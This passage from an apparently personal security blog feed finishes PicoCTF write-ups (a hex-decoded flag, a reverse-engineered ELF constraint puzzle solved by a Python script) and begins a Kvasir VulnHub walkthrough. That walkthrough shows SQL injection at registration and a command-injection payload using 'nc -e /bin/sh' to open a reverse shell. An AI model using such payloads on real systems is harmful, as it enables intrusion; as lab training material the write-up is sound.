</span><span class='line'>0x476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732eL
</span><span class='line'>bas@tritonal:~/tmp/picoctf/low_entropy<span class="nv">$ </span>xxd -r -p
</span><span class='line'>476f6f64207468696e67206e6f206f6e652063616e207265616420746869732120492764206861746520666f72207468656d20746f206b6e6f7720746861742074686520666c6167206973206d616b655f737572655f796f75725f726e675f67656e6572617465735f6c6f7473615f7072696d65732e
</span><span class='line'>Good thing no one can <span class="nb">read </span>this! I<span class="err">&#39;</span>d hate <span class="k">for</span> them to know that the flag is make_sure_your_rng_generates_lotsa_primes.
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>make_sure_your_rng_generates_lotsa_primes</code>.</p>

<h1>Bit Puzzle (130 points)</h1>

<p>The last bastion of PicoCTF! <code>bitpuzzle</code> is a 32-bit ELF file. It asks for a string and first checks if the string is 32 bytes long. Then, it chops it up into four-byte chunks and does certain checks on each chunk, effectively constraining the values that are valid. In the end, if the string passes all checks, then that string is the flag. Looking at other flags, this probably limited our characterset to lowercase plus underscore. The first chuck-checking constraint was this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>EAX: 0x37363534 <span class="o">(</span><span class="s1">&#39;4567&#39;</span><span class="o">)</span>
</span><span class='line'>EBX: 0xffffd21c <span class="o">(</span><span class="s2">&quot;0123456789abcdefABCDEFGHIJKLMNOP&quot;</span><span class="o">)</span>
</span><span class='line'>ECX: 0xffffffde
</span><span class='line'>EDX: 0x33323130 <span class="o">(</span><span class="s1">&#39;0123&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x62613938 <span class="o">(</span><span class="s1">&#39;89ab&#39;</span><span class="o">)</span>
</span><span class='line'>EBP: 0xffffd338 --&gt; 0xffffd3b8 --&gt; 0x0
</span><span class='line'>ESP: 0xffffd200 --&gt; 0xffffd21c <span class="o">(</span><span class="s2">&quot;0123456789abcdefABCDEFGHIJKLMNOP&quot;</span><span class="o">)</span>
</span><span class='line'>EIP: 0x804858e <span class="o">(</span>lea    ebx,<span class="o">[</span>edi+eax*1<span class="o">])</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x8048582: mov    edx,DWORD PTR <span class="o">[</span>esp+0x1c<span class="o">]</span>
</span><span class='line'>   0x8048586: mov    eax,DWORD PTR <span class="o">[</span>esp+0x20<span class="o">]</span>
</span><span class='line'>   0x804858a: mov    edi,DWORD PTR <span class="o">[</span>esp+0x24<span class="o">]</span>
</span><span class='line'><span class="o">=</span>&gt; 0x804858e:   lea    ebx,<span class="o">[</span>edi+eax*1<span class="o">]</span>
</span><span class='line'>   0x8048591: mov    ecx,0x0
</span><span class='line'>   0x8048596: cmp    ebx,0xc0dcdfce
</span><span class='line'>   0x804859c: jne    0x80485ad
</span></code></pre></td></tr></table></div></figure>


<p>So for this first constraint, we see that <code>var2 + var3 == 0xc0dcdfce</code>. I stepped through the code and set <code>ebx</code> to the right value, allowing me to see the other checks. I wrote them down:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">((</span>b+c<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xc0dcdfce
</span><span class='line'><span class="o">((</span>a+b<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xd5d3dddc
</span><span class='line'><span class="o">((</span>a*3+b*5<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x404a7666
</span><span class='line'><span class="o">((</span>a ^ d<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x18030607
</span><span class='line'><span class="o">((</span>a <span class="p">&amp;</span> d<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x666c6970
</span><span class='line'><span class="o">((</span>b * e<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xb180902b
</span><span class='line'><span class="o">((</span>c * e<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x3e436b5f
</span><span class='line'><span class="o">((</span>e * f*2<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x5c483831
</span><span class='line'><span class="o">((</span>f <span class="p">&amp;</span> 0x70000000<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x70000000
</span><span class='line'><span class="o">((</span>f / g<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 1
</span><span class='line'><span class="o">((</span>f % g<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xe000cec
</span><span class='line'><span class="o">((</span>e*3+i*2<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x3726eb17
</span><span class='line'><span class="o">((</span>c*4+i*7<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0x8b0b922d
</span><span class='line'><span class="o">((</span>d+i*3<span class="o">)</span> <span class="p">&amp;</span> 0xffffffff<span class="o">)</span> <span class="o">==</span> 0xb9cf9c91
</span></code></pre></td></tr></table></div></figure>


<p>What else can we infer? Well, since <code>a+b == 0xd5...</code>, <code>0xd5 - first char of a</code> must be within the ASCII range too. This allowed me to narrow down the values that were possible for the first three chunks of the flag. After messing with <code>python-constraint</code>, I started writing my own script. This first script uses python sets, and used just shy of 6 GB of memory; way too much for my poor laptop. I re-wrote the code to use just integer arithmetic. Below is the final script. It&rsquo;s super ugly, but it&rsquo;s late and I&rsquo;m tired!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span><span class="o">,</span> <span class="nn">string</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">h</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">z</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">strToInt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span><span class='line'>      <span class="n">i</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="n">i</span> <span class="o">+=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">i</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Generating potential strings...&quot;</span>
</span><span class='line'><span class="n">sz</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">map</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">,</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="s">&quot;_&quot;</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">))]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Converting potential strings to ints...&quot;</span>
</span><span class='line'><span class="n">allowed</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sz</span><span class="p">:</span>
</span><span class='line'>  <span class="n">allowed</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">strToInt</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Brutef... Erm, Constraining...&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">s1</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>  <span class="n">s2</span> <span class="o">=</span> <span class="mh">0xd5d3dddc</span> <span class="o">-</span> <span class="n">s1</span>
</span><span class='line'>  <span class="c"># OK, so s2+s1 = 0xd0... so we know that that x1 = 0xd0-x2</span>
</span><span class='line'>  <span class="c"># For s1 starting with 61..7a (a-z), 0xd0 - x1 is 0x5b..0x74. </span>
</span><span class='line'>  <span class="c"># For s1 starting with 41..5a and 30..39, 0xd0 - x1 becomes too large!</span>
</span><span class='line'>  <span class="c"># Therefor, s2 must start with 0x5B .. 0x74 inclusive. </span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&gt;=</span> <span class="mh">0x5B000000</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&lt;</span> <span class="mh">0x75000000</span><span class="p">):</span>
</span><span class='line'>      <span class="n">s3</span> <span class="o">=</span> <span class="mh">0xc0dcdfce</span> <span class="o">-</span> <span class="n">s2</span>
</span><span class='line'>      <span class="c"># The same applies for s3</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">s3</span> <span class="o">&gt;=</span> <span class="mh">0x4c000000</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s3</span> <span class="o">&lt;</span> <span class="mh">0x66000000</span><span class="p">):</span>
</span><span class='line'>          <span class="c"># This is another constraint</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span> <span class="p">((</span><span class="n">s1</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">s2</span><span class="o">*</span><span class="mi">5</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x404a7666</span><span class="p">:</span>
</span><span class='line'>              <span class="n">s4</span> <span class="o">=</span> <span class="mh">0x18030607</span> <span class="o">^</span> <span class="n">s1</span>
</span><span class='line'>              <span class="k">if</span> <span class="n">s4</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s1: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s1</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s2: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s2</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s3: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s3</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">print</span> <span class="s">&quot;s4: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s4</span><span class="p">))</span>
</span><span class='line'>                  <span class="k">for</span> <span class="n">s5</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                      <span class="k">if</span> <span class="p">((</span><span class="n">s5</span> <span class="o">*</span> <span class="n">s2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb180902b</span><span class="p">:</span>
</span><span class='line'>                          <span class="k">if</span> <span class="p">((</span><span class="n">s5</span> <span class="o">*</span> <span class="n">s3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3e436b5f</span><span class="p">:</span>
</span><span class='line'>                              <span class="k">print</span> <span class="s">&quot;s5: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s5</span><span class="p">))</span>
</span><span class='line'>                              <span class="k">for</span> <span class="n">s6</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                                  <span class="k">if</span> <span class="p">(</span><span class="n">s6</span> <span class="o">&amp;</span> <span class="mh">0x70000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x70000000</span><span class="p">:</span>
</span><span class='line'>                                      <span class="c">#problem.addConstraint(lambda e, f: ((e * f*2) &amp; 0xffffffff) == 0x5c483831, (&quot;e&quot;, &quot;f&quot;))</span>
</span><span class='line'>                                      <span class="c">#problem.addConstraint(lambda f: ((f &amp; 0x70000000) &amp; 0xffffffff) == 0x70000000, (&quot;f&quot;))</span>
</span><span class='line'>                                      <span class="k">if</span> <span class="p">((</span><span class="n">s5</span> <span class="o">+</span> <span class="p">((</span><span class="n">s6</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5c483831</span><span class="p">:</span>
</span><span class='line'>                                          <span class="k">print</span> <span class="s">&quot;s6: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s6</span><span class="p">))</span>
</span><span class='line'>                                          <span class="k">for</span> <span class="n">s7</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                                              <span class="k">if</span> <span class="p">((</span><span class="n">s6</span> <span class="o">/</span> <span class="n">s7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>                                                  <span class="k">if</span> <span class="p">((</span><span class="n">s6</span> <span class="o">%</span> <span class="n">s7</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xe000cec</span><span class="p">:</span>
</span><span class='line'>                                                      <span class="k">print</span> <span class="s">&quot;s7: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s7</span><span class="p">))</span>
</span><span class='line'>                                                      <span class="k">for</span> <span class="n">s8</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
</span><span class='line'>                                                          <span class="c">#((e*3+i*2) &amp; 0xffffffff) == 0x3726eb17, (&quot;e&quot;, &quot;i&quot;))</span>
</span><span class='line'>                                                          <span class="c">#((c*4+i*7) &amp; 0xffffffff) == 0x8b0b922d, (&quot;c&quot;, &quot;i&quot;))</span>
</span><span class='line'>                                                          <span class="c">#((d+i*3) &amp; 0xffffffff) == 0xb9cf9c91, (&quot;d&quot;, &quot;i&quot;))</span>
</span><span class='line'>                                                          <span class="k">if</span> <span class="p">(((</span><span class="n">s5</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="n">s8</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3726eb17</span><span class="p">:</span>
</span><span class='line'>                                                              <span class="k">if</span> <span class="p">(((</span><span class="n">s3</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="n">s8</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8b0b922d</span><span class="p">:</span>
</span><span class='line'>                                                                  <span class="k">if</span> <span class="p">(((</span><span class="n">s4</span> <span class="o">*</span> <span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span><span class="o">+</span><span class="p">((</span><span class="n">s8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb9cf9c91</span><span class="p">:</span>
</span><span class='line'>                                                                      <span class="k">print</span> <span class="s">&quot;s8: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">s8</span><span class="p">))</span>
</span><span class='line'>                                                                      <span class="k">print</span> <span class="s">&quot;The flag is: &quot;</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s1</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s2</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s3</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s4</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s5</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s6</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s7</span><span class="p">)</span><span class="o">+</span><span class="n">h</span><span class="p">(</span><span class="n">s8</span><span class="p">)</span>
</span><span class='line'>                                                                      <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>The flag is: solving_equations_is_lots_of_fun</code>. That was the last challenge done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[We Need to Go Deeper: Kvasir Writeup]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/"/>
    <updated>2014-11-03T18:51:05+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup</id>
    <content type="html"><![CDATA[<p>I was asked to test <a href="https://twitter.com/_RastaMouse">Rasta Mouse&rsquo;s</a> awesome VM called <a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a> some time ago, which I always find an honor. I figured it was time to do a writeup!</p>

<!--more-->


<p>Disclaimer: Since I did this VM a while ago, and tested several versions, this write-up is not going to describe my exact thought-process. Sometimes, I&rsquo;ll skip over one or two steps. I&rsquo;m sorry for that, but rest assured I gave Kvasir all the love it deserved ;]</p>

<p>After importing the VM into VirtualBox and disabling the USB 2.0 Controller, I booted it up and waited a while. It takes some time for the VM to fully start. Meanwhile, I scanned it with <code>nmap</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>sudo nmap -sS -T4 10.8.7.101
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-03 19:00 CET
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.8.7.101
</span><span class='line'>Host is up <span class="o">(</span>0.00092s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">999</span> closed ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 08:00:27:CF:5D:57 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 39.73 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Hmm. Let&rsquo;s load up that webpage.</p>

<p><img src="http://barrebas.github.io/assets/kvasir/00.png" alt="" /></p>

<p>It&rsquo;s a login page, but we have no valid login. We can create one, but that got me nowhere. Testing for the usual SQL injections did no good. Let&rsquo;s go and register:</p>

<p><img src="http://barrebas.github.io/assets/kvasir/01.png" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for</span> the right syntax to use near <span class="s1">&#39;bas&#39;</span> <span class="s1">&#39;, &#39;</span>bas<span class="s1">&#39;&#39;</span>, 0, NULL<span class="o">)</span><span class="err">&#39;</span> at line 1
</span></code></pre></td></tr></table></div></figure>


<p>An SQL error! Part of the query that is supposed to add a new user to the database is visible. The <code>0, NULL</code> values seemed meaningful. It could be that the <code>0</code> controls some aspect of the user, like permissions. I injected the following SQL:</p>

<p><img src="http://barrebas.github.io/assets/kvasir/02.png" alt="" /></p>

<p>After logging in, I was redirected to <code>admin.php</code>:</p>

<p><img src="http://barrebas.github.io/assets/kvasir/03.png" alt="" /></p>

<p>This smells like command injection to me! Let&rsquo;s try something:</p>

<p><img src="http://barrebas.github.io/assets/kvasir/04.png" alt="" /></p>

<p>Cool, we have command injection. Can we get a shell on the box?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>apache2<span class="p">;</span> nc -e /bin/sh 10.8.7.1 <span class="m">7777</span> <span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the netcat listener ($ added for clarity):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc -vlnp 7777
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">7777</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.8.7.1<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.8.7.101<span class="o">]</span> 39148
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>www-data
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>admin.php
</span><span class='line'>index.php
</span><span class='line'>login.php
</span><span class='line'>logout.php
